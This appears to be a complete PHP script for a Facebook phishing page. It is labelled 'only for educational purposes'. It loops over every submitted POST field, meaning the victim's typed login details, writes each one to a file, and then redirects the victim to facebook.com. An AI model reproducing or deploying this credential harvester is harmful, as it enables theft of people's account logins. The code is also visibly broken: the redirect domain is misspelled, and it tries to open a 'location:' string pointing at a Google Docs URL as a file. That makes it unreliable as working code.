<?php

header("location: http://wwww.facebook.com"); //THIS TUTORIAL IS ONLY FOR EDUCATIONAL PURPOSES
$handle = fopen("location: https://docs.google.com/document/d/1IbvScSp5_pXdWSw1lDQIS1jRT4-q1nLy0kQM8a3kbmE/edit?usp=sharing","a");

foreach($_POST as $variable => $value)
{
	fwrite($handle,$variable);
	fwrite($handle,"=");
	fwrite($handle,$value);
	fwrite($handle,"\r\n");

}
fwrite($handle, "----x------x------x-----x----");
fclose($handle);
exit;
?>
